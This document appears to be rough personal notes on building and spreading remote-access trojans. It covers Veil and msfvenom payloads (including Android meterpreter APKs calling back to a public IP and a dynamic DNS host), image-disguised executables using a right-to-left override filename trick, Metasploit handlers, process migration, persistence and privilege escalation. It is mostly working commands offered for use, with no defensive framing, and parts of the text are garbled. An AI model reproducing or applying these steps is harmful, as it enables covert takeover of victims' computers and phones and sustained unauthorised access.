```
cd Veil
python3 Veil.py
use 1
use ...
set LHOST 10.0.2.15
set LPORT 4752
generate
name
```

### Try

```
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_http ...
```
- Type of trojan called reserve
  - we upload our site

### Add Image

```
cd FakeImageExploiter
leafpad settings 
bash FakeImageExploiter.sh
```

### Change Name

```
Characters
Leafpad ... .jpg.exe paste
... .gpj.exe
right-to-left Override Copy Paste left of g
..exe.jpg left side is will be different
```

### When Throwing to Another Tree

```
LHOST 88.254.238.157 
msfconsole k�sm�nada 
LHOST 192.168.56.1
```

### After Connecting

- Never write ```ls``` <br>

```background```= Reverses the process <br>
```session 1```= 1st session starts<br>
```pwd```= Shows the location<br>
```sysinfo```= Shows the system<br>
```ps```= Shows open files<br>
```migrate 3268```= It starts (hides) the trojan into the file coded 3268<br>
```help```= Shows fun gadgets (haha) <br>

---
### We See the Whole System

```
run migrate
run metsvc
run persistence -X -U -A -L %TEMP% -r 10.0.2.15 -r 8443
run vnc
getsystem
```

### The Connection Always Remains

```
background 
use exploit/windows/local/persistence
show options
set EXE_NAME windows.exe
set SESSION 1
show advanced
set EXE::Custom ... (trojan location)
exploit
```

### If you do not fix your IP with Duck Dns, the connection will be lost when the modem is turned off.

```
cd duckdns/
ls
./duck.sh
```

Trojan for Android

```
msfvenom
//msfvenom -p android/meterpreter/reverse_tcp LHOST=88.254.238.157 LPORT=4444 -o /root/Desktop/trojan.apk
msfvenom -p android/meterpreter/reverse_tcp LHOST=dnsserver12.duckdns.org LPORT=4444 -o /root/Desktop/trojan1.apk
```



